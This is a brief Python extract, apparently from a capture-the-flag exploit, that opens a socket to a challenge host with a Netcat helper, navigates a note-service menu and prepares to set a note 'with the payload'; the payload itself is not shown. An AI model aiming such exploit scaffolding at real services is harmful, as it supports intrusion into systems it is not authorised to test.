# below is a extract from a sample exploit that
# interfaces with a tcp socket
from Netcat import Netcat

# start a new Netcat() instance
nc = Netcat('pwctf.dk', 19937)

# get to the prompt
nc.read_until('>')
output = nc.read()
print(output)
# start a new note
nc.write('new' + '\n')
print(nc.read_until('>'))

# set note 0 with the payload
nc.write('set' + '\n')
nc.read_until('id:')